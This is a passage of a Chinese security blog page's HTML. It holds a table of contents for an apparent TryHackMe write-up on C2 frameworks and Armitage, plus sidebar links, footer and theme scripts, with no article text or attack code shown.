class="toc-text">启动并连接到 Armitage</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-c2%E6%93%8D%E4%BD%9C%E5%9F%BA%E7%A1%80"><span class="toc-number">5.</span> <span class="toc-text">0x05 C2操作基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%92%8C%E7%AE%A1%E7%90%86%E6%82%A8%E7%9A%84-c2-%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD"><span class="toc-number">5.1.</span> <span class="toc-text">访问和管理您的 C2 基础设施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8"><span class="toc-number">5.1.1.</span> <span class="toc-text">基本操作安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E7%9B%91%E5%90%AC%E7%9A%84%E8%BF%9C%E7%A8%8B-c2-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">5.1.2.</span> <span class="toc-text">访问本地监听的远程 C2 服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8armitage%E7%AE%80%E5%8E%86%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">5.1.3.</span> <span class="toc-text">在Armitage简历监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%9B%9E%E8%B0%83"><span class="toc-number">5.1.4.</span> <span class="toc-text">获得回调</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.2.</span> <span class="toc-text">监听器类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#standard-listener"><span class="toc-number">5.2.1.</span> <span class="toc-text">Standard Listener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#httphttps-listeners"><span class="toc-number">5.2.2.</span> <span class="toc-text">HTTP&#x2F;HTTPS Listeners</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns-listener"><span class="toc-number">5.2.3.</span> <span class="toc-text">DNS Listener</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-listener"><span class="toc-number">5.2.4.</span> <span class="toc-text">SMB Listener</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%91%BD%E4%BB%A4-%E6%8E%A7%E5%88%B6%E5%92%8C%E5%BE%81%E6%9C%8D"><span class="toc-number">6.</span> <span class="toc-text">0x06 命令、控制和征服</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞利用示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-armitage-%E8%BF%9B%E8%A1%8C%E4%B8%BB%E6%9C%BA%E6%9E%9A%E4%B8%BE"><span class="toc-number">6.1.1.</span> <span class="toc-text">使用 Armitage 进行主机枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#armitage-%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">Armitage 的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#practice-time"><span class="toc-number">6.1.3.</span> <span class="toc-text">Practice Time</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">6.1.4.</span> <span class="toc-text">解决方案</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E9%AB%98%E7%BA%A7c2%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.</span> <span class="toc-text">0x07 高级C2设置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E6%98%AF%E6%9C%89%E6%94%B9%E8%BF%9B%E7%9A%84%E7%A9%BA%E9%97%B4"><span class="toc-number">7.1.</span> <span class="toc-text">总是有改进的空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c2-%E9%87%8D%E5%AE%9A%E5%90%91%E5%99%A8"><span class="toc-number">7.2.</span> <span class="toc-text">C2 重定向器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%87%8D%E5%AE%9A%E5%90%91%E5%99%A8"><span class="toc-number">7.2.1.</span> <span class="toc-text">什么是重定向器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E5%99%A8%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.2.2.</span> <span class="toc-text">重定向器如何设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E6%A0%87%E5%A4%B4%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD"><span class="toc-number">7.2.3.</span> <span class="toc-text">使用修改后的标头生成有效负载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-apache-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.4.</span> <span class="toc-text">修改 Apache 配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%9A%E9%87%8D%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F"><span class="toc-number">7.2.5.</span> <span class="toc-text">设置漏洞利用&#x2F;多重&#x2F;处理程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x08 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#recap-%E5%9B%9E%E9%A1%BE"><span class="toc-number">8.1.</span> <span class="toc-text">Recap 回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9-c2-%E6%A1%86%E6%9E%B6"><span class="toc-number">8.2.</span> <span class="toc-text">如何选择 C2 框架</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
